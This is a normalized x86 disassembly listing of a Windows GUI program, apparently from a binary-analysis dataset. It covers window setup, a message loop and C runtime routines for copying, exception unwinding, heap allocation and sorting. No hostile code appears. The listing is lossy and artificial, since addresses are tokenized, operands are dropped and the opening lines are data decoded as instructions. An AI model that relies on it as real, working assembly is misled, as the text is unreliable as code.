add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x3050205
add eax 0x5050505
add eax 0x5050505
add eax 0x4050505
enter 0x4286 0x0
out dx al
xchg [ edx ] al
in al 0x86
inc edx
add al bh
xchg [ edx ] al
or [ edi - 0x76c0ffbe ] al
inc edx
add [ eax ] al
add eax 0x5020101
add eax 0x5030505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x8b040505
[ ebx ]
sub_428c20
sub esp 0x244
push 0x0
call [ CoInitialize@IAT ]
test eax eax
je r-xdata
push ebx
mov ebx [ esp + 0x24c ]
push esi
push edi
push 0x0
push 0x0
push r--data
mov ecx rw-data
mov [ rw-data ] ebx
call sub_425ab0
push eax
call [ LoadLibraryA@IAT ]
test eax eax
mov [ rw-data ] eax
jne r-xdata
push 0x19
call sub_4254e0
push 0x25
call sub_420ca0
mov cl [ eax ]
add esp 0x4
cmp cl 0x57
jne r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
jmp r-xdata
mov ecx [ rw-data ]
push ecx
call [ FreeLibrary@IAT ]
mov eax [ rw-data ]
mov edx [ rw-data ]
push eax
push 0x10
push 0x27
push 0x26
push 0x0
mov [ rw-data ] edx
call sub_420e20
add esp 0x14
push 0x4
inc eax
push r--data
push eax
call sub_431a51
add esp 0xc
test eax eax
je r-xdata
call [ InitCommonControls@IAT ]
mov ecx [ rw-data ]
mov esi [ LoadMenuA@IAT ]
push 0x334
push ecx
call esi
test eax eax
mov [ rw-data ] eax
jne r-xdata
mov edx [ rw-data ]
push 0x335
push edx
call esi
test eax eax
mov [ rw-data ] eax
jne r-xdata
push 0xb
call sub_4254e0
push 0x320
push ebx
call [ LoadAcceleratorsA@IAT ]
test eax eax
mov [ rw-data ] eax
jne r-xdata
push 0xc
call sub_4254e0
mov eax [ esp + 0x258 ]
test eax eax
jne r-xdata
push 0xd
call sub_4254e0
xor esi esi
xor eax eax
push 0x370
mov ecx 0xa
lea edi [ esp + 0x10 ]
[ edi ]
push ebx
lea esi [ esp + 0x14 ]
mov [ esp + 0x18 ] sub_4284c0
mov [ esp + 0x20 ] 0x4
mov [ esp + 0x24 ] ebx
call [ LoadIconA@IAT ]
push 0x7f00
push 0x0
mov [ esp + 0x28 ] eax
mov [ esp + 0x30 ] 0x5
mov [ esp + 0x38 ] r--data
call [ LoadCursorA@IAT ]
mov [ esp + 0x24 ] eax
lea eax [ esp + 0xc ]
push eax
call [ RegisterClassA@IAT ]
test ax ax
jne r-xdata
mov edx [ rw-data ]
mov eax [ rw-data ]
mov ecx [ rw-data ]
push 0x0
push ebx
push 0x0
push 0x0
push edx
mov edx [ rw-data ]
push eax
push ecx
push edx
push 0xcf0000
push r--data
push r--data
push 0x410
call [ CreateWindowExA@IAT ]
test eax eax
mov [ rw-data ] eax
jne r-xdata
mov ecx rw-data
call sub_425e50
lea ecx [ esp + 0x50 ]
push ecx
push 0x5
call sub_420c00
add esp 0x8
push eax
call [ SetCurrentDirectoryA@IAT ]
mov ecx rw-data
call sub_425bb0
test eax eax
je r-xdata
push 0xe
call sub_4254e0
mov ecx [ esp + 0x260 ]
cmp ecx 0x2
je r-xdata
push 0xf
call sub_4254e0
push ecx
push eax
call [ ShowWindow@IAT ]
mov eax [ rw-data ]
push eax
call [ UpdateWindow@IAT ]
mov ecx [ rw-data ]
mov edx [ rw-data ]
push ecx
push edx
call [ SetMenu@IAT ]
push 0x0
mov ecx rw-data
call sub_424650
push 0x0
call sub_418180
push 0x0
push 0x1
call sub_401980
add esp 0xc
call sub_418630
call sub_414a90
test eax eax
je r-xdata
mov dl [ rw-data ]
test dl dl
je r-xdata
push esi
mov ecx rw-data
call sub_424940
test eax eax
je r-xdata
push 0x11
call sub_420ca0
push eax
push 0x10
call sub_4254e0
mov dl [ rw-data ]
test dl dl
je r-xdata
push esi
mov ecx rw-data
call sub_4035a0
test eax eax
je r-xdata
push 0x12
call sub_420ca0
push eax
push 0x10
call sub_4254e0
mov ecx 0x3
push esi
call sub_40d500
add esp 0x4
test eax eax
je r-xdata
push 0x13
call sub_420ca0
push eax
push 0x10
call sub_4254e0
call sub_4283e0
test eax eax
je r-xdata
push 0x14
call sub_420ca0
push eax
push 0x10
call sub_4254e0
push esi
call sub_4164c0
add esp 0x4
test eax eax
je r-xdata
push 0x15
call sub_420ca0
push eax
push 0x10
call sub_4254e0
push esi
call sub_420390
add esp 0x4
test eax eax
je r-xdata
push 0x16
call sub_420ca0
push eax
push 0x10
call sub_4254e0
push rw-data
call sub_422cb0
add esp 0x4
push 0x0
mov ecx rw-data
call sub_424260
mov eax [ esp + 0x25c ]
push eax
call sub_4252e0
add esp 0x4
test eax eax
je r-xdata
push 0x17
call sub_420ca0
push eax
push 0x10
call sub_4254e0
push 0x0
call sub_425660
add esp 0x4
push 0x0
push 0x0
push 0x0
lea ecx [ esp + 0x40 ]
push ecx
call [ GetMessageA@IAT ]
test eax eax
je r-xdata
push 0x18
call sub_420ca0
push eax
push 0x10
call sub_4254e0
call [ CoUninitialize@IAT ]
mov eax [ esp + 0x3c ]
pop edi
pop esi
pop ebx
add esp 0x244
retn 0x10
mov edi [ IsDialogMessageA@IAT ]
mov ebx [ TranslateMessage@IAT ]
push ebp
mov ebp [ DispatchMessageA@IAT ]
mov edx [ rw-data ]
mov eax [ rw-data ]
lea ecx [ esp + 0x38 ]
push ecx
push edx
push eax
call [ TranslateAcceleratorA@IAT ]
test eax eax
jne r-xdata
nop
push 0x0
push 0x0
push 0x0
lea eax [ esp + 0x44 ]
push eax
call [ GetMessageA@IAT ]
test eax eax
jne r-xdata
lea ecx [ esp + 0x38 ]
push ecx
call ebx
lea edx [ esp + 0x38 ]
push edx
call ebp
mov esi [ esi ]
test esi esi
jne r-xdata
mov esi [ rw-data ]
test esi esi
je r-xdata
pop ebp
mov eax [ esi + 0x4 ]
lea edx [ esp + 0x38 ]
push edx
push eax
call edi
test eax eax
jne r-xdata
sub_429090
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
test edi 0x3
jne r-xdata
cmp edi eax
jb r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_4290f0 ]
jmp [ ecx * 4 + jump_table_429170 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4291dc ]
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_4291dc ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
jmp [ ecx * 4 + jump_table_429378 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_42927c ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_429378 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4291dc ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4291dc ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4291dc ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_429378 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_429378 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_429378 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_429378 ]
sub_4293d2
push 0x14
push r--data
call sub_42a4d8
and [ ebp - 0x4 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
call sub_42a513
retn 0x10
mov ecx [ ebp + 0x8 ]
sub ecx [ ebp + 0xc ]
mov [ ebp + 0x8 ] ecx
call [ ebp + 0x14 ]
jmp r-xdata
dec [ ebp + 0x10 ]
js r-xdata
sub_429430
push 0xc
push r--data
call sub_42a4d8
and [ ebp - 0x1c ] 0x0
mov esi [ ebp + 0xc ]
mov eax esi
imul eax [ ebp + 0x10 ]
add [ ebp + 0x8 ] eax
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x1c ] 0x1
or [ ebp - 0x4 ] 0xffffffff
call sub_429478
call sub_42a513
retn 0x10
sub [ ebp + 0x8 ] esi
mov ecx [ ebp + 0x8 ]
call [ ebp + 0x14 ]
jmp r-xdata
dec [ ebp + 0x10 ]
js r-xdata
sub_429490
push 0x10
push r--data
call sub_42a4d8
xor eax eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0x1
or [ ebp - 0x4 ] 0xffffffff
call sub_4294da
call sub_42a513
retn 0x14
mov esi [ ebp + 0x8 ]
mov ecx esi
call [ ebp + 0x14 ]
add esi [ ebp + 0xc ]
mov [ ebp + 0x8 ] esi
inc [ ebp - 0x20 ]
jmp r-xdata
mov eax [ ebp - 0x20 ]
cmp eax [ ebp + 0x10 ]
jge r-xdata
sub_4294f2
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov esp [ ebx - 0x4 ]
mov ebp [ ebp - 0x4 ]
jmp eax
sub_429529
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov esi [ fs : 0x0 ]
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x8 ] r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call RtlUnwind
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
and eax 0xfffffffd
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov edi [ fs : 0x0 ]
mov ebx [ ebp - 0x4 ]
mov [ ebx ] edi
mov [ fs : 0x0 ] ebx
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_42957b
push ebp
mov ebp esp
sub esp 0x4
push ebx
push esi
push edi
cld
mov [ ebp - 0x4 ] eax
xor eax eax
push eax
push eax
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_42acbd
add esp 0x20
mov [ ebp - 0x4 ] eax
pop edi
pop esi
pop ebx
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_4295b1
cld
mov eax [ esp + 0x8 ]
push 0x0
push eax
push [ eax + 0x10 ]
push [ eax + 0x8 ]
push 0x0
push [ esp + 0x20 ]
push [ eax + 0xc ]
push [ esp + 0x20 ]
call sub_42acbd
add esp 0x20
retn
sub_4295d5
push ebp
mov ebp esp
push ebx
cld
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0x66
test eax eax
je r-xdata
push 0x1
mov eax [ ebp + 0xc ]
push [ eax + 0x14 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x8 ]
push 0x0
push [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0xc ]
push [ ebp + 0x8 ]
call sub_42acbd
add esp 0x20
mov eax [ ebp + 0xc ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
xor eax eax
inc eax
jmp r-xdata
mov ebx [ ebp + 0xc ]
mov esp [ ebx + 0x1c ]
mov ebp [ ebx + 0x20 ]
jmp [ ebx + 0x18 ]
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_429529
pop ebx
pop ebp
retn
sub_429646
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0xc ] 0x0
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi [ edi + 0xc ]
mov ebx [ edi + 0x10 ]
mov eax esi
mov [ ebp - 0x4 ] eax
mov [ ebp + 0x8 ] esi
jl r-xdata
mov ecx [ ebp + 0x14 ]
inc esi
mov [ ecx ] esi
mov ecx [ ebp + 0x18 ]
mov [ ecx ] eax
cmp eax [ edi + 0xc ]
ja r-xdata
cmp esi 0xffffffff
jne r-xdata
call sub_42a4ab
cmp esi eax
jbe r-xdata
mov ecx [ ebp + 0x10 ]
dec esi
lea eax [ esi + esi * 4 ]
lea eax [ ebx + eax * 4 ]
cmp [ eax + 0x4 ] ecx
jge r-xdata
call sub_42a4ab
pop edi
lea eax [ esi + esi * 4 ]
pop esi
lea eax [ ebx + eax * 4 ]
pop ebx
leave
retn
cmp esi 0xffffffff
jne r-xdata
cmp ecx [ eax + 0x8 ]
jle r-xdata
cmp [ ebp + 0xc ] 0x0
jge r-xdata
mov eax [ ebp + 0x8 ]
dec [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
mov [ ebp + 0x8 ] esi
mov eax [ ebp - 0x4 ]
sub_4296f4
mov edx [ esp + 0x4 ]
mov eax [ rw-data ]
cmp edx eax
jne r-xdata
mov ecx eax
add eax 0x4
jmp r-xdata
mov eax [ edx + 0x4 ]
mov [ rw-data ] eax
retn
cmp [ eax ] 0x0
jne r-xdata
mov eax [ eax ]
cmp edx eax
je r-xdata
jmp sub_42a4ab
mov eax [ edx + 0x4 ]
mov [ ecx + 0x4 ] eax
retn
mov ecx eax
lea eax [ ecx + 0x4 ]
sub_42972d
push ebp
mov ebp esp
sub esp 0x14
mov eax [ ebp + 0xc ]
and [ ebp - 0x14 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x14 ]
inc eax
mov [ ebp - 0x10 ] sub_4295b1
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov eax [ fs : 0x0 ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x14 ]
mov [ fs : 0x0 ] eax
push [ ebp + 0x18 ]
push ecx
push [ ebp + 0x10 ]
call sub_42ad60
mov ecx eax
mov eax [ ebp - 0x14 ]
mov [ fs : 0x0 ] eax
mov eax ecx
leave
retn
sub_42977e
push ebp
mov ebp esp
sub esp 0x34
push ebx
and [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] sub_4295d5
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x14 ] eax
and [ ebp - 0x10 ] 0x0
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] r-xdata
mov [ ebp - 0xc ] esp
mov [ ebp - 0x8 ] ebp
mov eax [ fs : 0x0 ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x34 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax ]
call [ rw-data ]
pop ecx
pop ecx
and [ ebp - 0x34 ] 0x0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov ebx [ ebp - 0x28 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
jmp r-xdata
mov eax [ ebp - 0x34 ]
pop ebx
leave
retn
sub_42982c
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42986e
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push eax
push 0xfffffffe
push sub_42984c
push [ fs : 0x0 ]
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
cmp esi [ esp + 0x24 ]
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0x8 ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_429902
call [ ebx + esi * 4 + 0x8 ]
mov eax [ esp + 0x20 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_429931
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
cmp [ rw-data ] 0x3
push esi
jne r-xdata
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
call sub_42ae5f
test eax eax
pop ecx
push esi
je r-xdata
push eax
call sub_42ae8a
pop ecx
pop ecx
pop esi
retn
sub_429969
push ebx
push esi
mov esi [ esp + 0xc ]
imul esi [ esp + 0x10 ]
test esi esi
push edi
mov ebx esi
jne r-xdata
xor edi edi
cmp esi 0xffffffe0
ja r-xdata
inc esi
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x3
jne r-xdata
mov eax edi
push esi
call sub_42b9a0
test eax eax
pop ecx
jne r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
add esi 0xf
and esi 0xfffffff0
cmp ebx [ rw-data ]
ja r-xdata
jmp r-xdata
push ebx
call sub_42b63e
mov edi eax
test edi edi
pop ecx
jne r-xdata
pop edi
pop esi
pop ebx
retn
push ebx
push 0x0
push edi
call sub_42b940
add esp 0xc
sub_4299e4
cmp [ rw-data ] 0x3
push esi
mov esi [ esp + 0x8 ]
jne r-xdata
test esi esi
jne r-xdata
cmp esi [ rw-data ]
ja r-xdata
cmp [ rw-data ] 0x1
je r-xdata
inc esi
push esi
call sub_42b63e
test eax eax
pop ecx
jne r-xdata
push esi
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
add esi 0xf
and esi 0xfffffff0
pop esi
retn
sub_429a2a
cmp [ esp + 0x4 ] 0xffffffe0
ja r-xdata
xor eax eax
push [ esp + 0x4 ]
call sub_4299e4
test eax eax
pop ecx
jne r-xdata
retn
cmp [ esp + 0x8 ] eax
je r-xdata
push [ esp + 0x4 ]
call sub_42b9a0
test eax eax
pop ecx
jne r-xdata
sub_429a68
push esi
push [ rw-data ]
call sub_42bcb4
pop ecx
mov ecx [ rw-data ]
mov esi eax
mov eax [ rw-data ]
mov edx ecx
sub edx eax
add edx 0x4
cmp esi edx
jae r-xdata
mov eax [ esp + 0x8 ]
mov [ ecx ] eax
add [ rw-data ] 0x4
pop esi
retn
mov ecx 0x800
cmp esi ecx
jae r-xdata
add ecx esi
push ecx
push eax
call sub_42b9bb
test eax eax
pop ecx
pop ecx
jne r-xdata
mov ecx esi
mov ecx [ rw-data ]
sub ecx [ rw-data ]
mov [ rw-data ] eax
sar ecx 0x2
lea ecx [ eax + ecx * 4 ]
mov [ rw-data ] ecx
add esi 0x10
push esi
push [ rw-data ]
call sub_42b9bb
test eax eax
pop ecx
pop ecx
jne r-xdata
pop esi
retn
sub_429afc
push 0x80
call sub_429a56
test eax eax
pop ecx
mov [ rw-data ] eax
jne r-xdata
and [ eax ] 0x0
mov eax [ rw-data ]
mov [ rw-data ] eax
xor eax eax
retn
push 0x18
pop eax
retn
sub_429b24
push ebp
mov ebp esp
push ecx
push ecx
cmp [ rw-data ] 0x0
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
je r-xdata
cmp ebx 0x41
jl r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
cmp ebx 0x5a
lea eax [ ebx + 0x20 ]
jle r-xdata
xor esi esi
mov edi 0x100
inc esi
cmp ebx edi
jae r-xdata
cmp ebx 0x7f
jbe r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov edx [ rw-data ]
mov eax ebx
sar eax 0x8
movzx ecx al
test [ edx + ecx * 2 + 0x1 ] 0x80
je r-xdata
cmp [ rw-data ] esi
jle r-xdata
and [ ebp - 0x3 ] 0x0
mov [ ebp - 0x4 ] bl
mov eax esi
and [ ebp - 0x2 ] 0x0
push 0x2
mov [ ebp - 0x4 ] al
mov [ ebp - 0x3 ] bl
pop eax
jmp r-xdata
mov eax [ rw-data ]
movzx eax [ eax + ebx * 2 ]
and eax esi
push esi
push ebx
call sub_42c0a8
pop ecx
pop ecx
jmp r-xdata
cmp eax esi
jne r-xdata
push esi
push [ rw-data ]
lea ecx [ ebp - 0x8 ]
push 0x3
push ecx
push eax
lea eax [ ebp - 0x4 ]
push eax
push edi
push [ rw-data ]
call sub_42bcec
add esp 0x20
test eax eax
je r-xdata
test eax eax
je r-xdata
movzx ecx [ ebp - 0x7 ]
xor eax eax
mov ah [ ebp - 0x8 ]
or eax ecx
jmp r-xdata
movzx eax [ ebp - 0x8 ]
jmp r-xdata
sub_429c00
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
jecxz r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov ebx ecx
mov edi [ ebp + 0x8 ]
mov esi edi
xor eax eax
[ edi ]
neg ecx
add ecx ebx
mov edi esi
mov esi [ ebp + 0xc ]
[ esi ] [ edi ]
mov al [ esi - 0x1 ]
xor ecx ecx
cmp al [ edi - 0x1 ]
ja r-xdata
not ecx
je r-xdata
sub ecx 0x2
sub_429c39
cmp [ rw-data ] 0x1
jle r-xdata
mov eax [ esp + 0x4 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x103
retn
push 0x103
push [ esp + 0x8 ]
call sub_42c0a8
pop ecx
pop ecx
retn
sub_429c67
cmp [ rw-data ] 0x1
jle r-xdata
mov eax [ esp + 0x4 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x1
retn
push 0x1
push [ esp + 0x8 ]
call sub_42c0a8
pop ecx
pop ecx
retn
sub_429c90
cmp [ rw-data ] 0x1
jle r-xdata
mov eax [ esp + 0x4 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x2
retn
push 0x2
push [ esp + 0x8 ]
call sub_42c0a8
pop ecx
pop ecx
retn
sub_429cb9
cmp [ rw-data ] 0x1
jle r-xdata
mov eax [ esp + 0x4 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8
retn
push 0x8
push [ esp + 0x8 ]
call sub_42c0a8
pop ecx
pop ecx
retn
sub_429ce2
cmp [ rw-data ] 0x1
jle r-xdata
mov eax [ esp + 0x4 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x107
retn
push 0x107
push [ esp + 0x8 ]
call sub_42c0a8
pop ecx
pop ecx
retn
sub_429d60
mov ecx [ esp + 0x4 ]
push ebp
mov ebp [ esp + 0xc ]
push edi
mov edi eax
cmp edi ecx
jbe r-xdata
pop edi
pop ebp
retn
push ebx
push esi
cmp ebx edi
mov eax edi
je r-xdata
jmp r-xdata
sub edi ebp
cmp edi ecx
ja r-xdata
test ebp ebp
je r-xdata
push ebx
push esi
call [ esp + 0x24 ]
add esp 0x8
test eax eax
jle r-xdata
lea esi [ ecx + ebp ]
cmp esi edi
mov ebx ecx
ja r-xdata
pop esi
pop ebx
mov ecx ebx
sub ecx edi
mov esi ebp
lea esp [ esp ]
add esi ebp
cmp esi edi
jbe r-xdata
mov ebx esi
mov bl [ eax ]
mov dl [ ecx + eax ]
mov [ ecx + eax ] bl
mov [ eax ] dl
inc eax
dec esi
jne r-xdata
mov ecx [ esp + 0x14 ]
mov ecx [ esp + 0x14 ]
sub_429dd0
mov eax [ esp + 0x8 ]
sub esp 0x100
cmp eax 0x2
jb r-xdata
add esp 0x100
retn
push ebx
push ebp
mov ebp [ esp + 0x114 ]
test ebp ebp
push esi
push edi
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
mov ebx [ esp + 0x114 ]
lea esi [ eax - 0x1 ]
imul esi ebp
add esi ebx
mov [ esp + 0x18 ] 0x0
mov [ esp + 0x10 ] ebx
mov [ esp + 0x14 ] esi
shr eax 0x1
imul eax ebp
add eax ebx
mov edi eax
push edi
push ebx
call [ esp + 0x128 ]
add esp 0x8
test eax eax
jle r-xdata
mov eax [ esp + 0x120 ]
push eax
push ebp
push ebx
mov eax esi
call sub_429d60
